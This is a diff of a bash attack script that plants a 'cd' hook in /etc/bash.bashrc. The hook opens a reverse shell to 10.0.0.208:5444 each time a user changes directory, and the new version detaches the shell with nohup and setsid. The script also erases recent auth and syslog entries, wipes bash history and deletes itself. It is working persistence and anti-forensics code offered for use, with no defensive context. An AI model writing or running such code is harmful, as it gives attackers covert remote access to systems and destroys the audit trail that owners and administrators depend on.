@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # === Stealth Reverse Shell Hook for 'cd' ===
-# Reverse shell: 10.0.0.208:5444
-# Injects into /etc/bash.bashrc and erases its own traces afterward
+# Reverse shell to: 10.0.0.208:5444
+# Injects into /etc/bash.bashrc, clears log traces + full bash history, and deletes itself
 
 HOOK_PORT=5444
 CALLBACK_IP="10.0.0.208"
@@ -10,29 +10,28 @@ TARGET_BASHRC="/etc/bash.bashrc"
 
 echo "[+] Installing stealth 'cd' hook..."
 
-# Only install if not already present
+# Check if already present
 if grep -q "# cd hook" "$TARGET_BASHRC"; then
-    echo "[*] Hook already exists. Skipping..."
+    echo "[*] Hook already exists. Skipping install."
     exit 0
 fi
 
-# Append stealth reverse shell function for 'cd'
-cat <<EOF >> "$TARGET_BASHRC"
+# Inject the silent, persistent reverse shell cd() function
+cat << 'EOF' >> "$TARGET_BASHRC"
 
 # cd hook
 cd() {
-  bash -c "python -c 'import pty; pty.spawn(\"/bin/bash\")' >& /dev/tcp/$CALLBACK_IP/$HOOK_PORT 0>&1" 2>/dev/null & disown
-  builtin cd "\$@"
+  builtin cd "$@" || return
+  ( nohup setsid bash -c 'python -c "import pty; pty.spawn(\"/bin/bash\")" >& /dev/tcp/10.0.0.208/5444 0>&1' >/dev/null 2>&1 < /dev/null & )
 }
 EOF
 
-echo "[+] Hook injected into $TARGET_BASHRC"
+echo "[+] Hook injected."
 
-# === Stealth Measures ===
+# === Stealth Cleanup ===
 
-echo "[*] Dynamically scrubbing logs from the past 10 minutes..."
+echo "[*] Scrubbing logs from the last 10 minutes..."
 
-# Get current time and 10 minutes ago as epoch
 now_epoch=$(date +%s)
 cutoff_epoch=$(date -d '10 minutes ago' +%s)
 
@@ -48,7 +47,6 @@ clean_log() {
     return ts
   }
   {
-    # Match syslog-style timestamp: e.g., "Apr 19 15:22:01"
     if ($1 ~ /^[A-Z][a-z]{2}$/ && $2 ~ /^[0-9]{1,2}$/ && $3 ~ /^[0-9]{2}:[0-9]{2}:[0-9]{2}$/) {
       log_time = parse_ts($1, $2, $3)
       if (log_time < cutoff || log_time > now) print $0
@@ -63,15 +61,23 @@ clean_log /var/log/auth.log
 clean_log /var/log/syslog
 clean_log /var/log/messages
 
-# Clear current session history
+echo "[+] Log scrub complete."
+
+# === Bash history wipe ===
+
+echo "[*] Clearing bash history..."
+
+# Clear history in current shell memory
 export HISTFILE=~/.bash_history
 history -c
-rm -f ~/.bash_history 2>/dev/null
-rm -f /root/.bash_history 2>/dev/null
+unset HISTFILE
 
-echo "[+] Log cleanup complete."
+# Remove any on-disk history
+rm -f ~/.bash_history /root/.bash_history 2>/dev/null
 
-# === Self-destruct the script after execution ===
+echo "[+] Bash history cleared."
+
+# === Self-delete ===
 
 echo "[*] Self-destructing..."
 SCRIPT_PATH="$0"
@@ -79,4 +85,4 @@ rm -f "$SCRIPT_PATH"
 unset SCRIPT_PATH
 history -d $(history 1) 2>/dev/null
 
-echo "[+] Script has removed itself."
+echo "[+] cd hook deployed and cleaned. Happy haunting 👻"
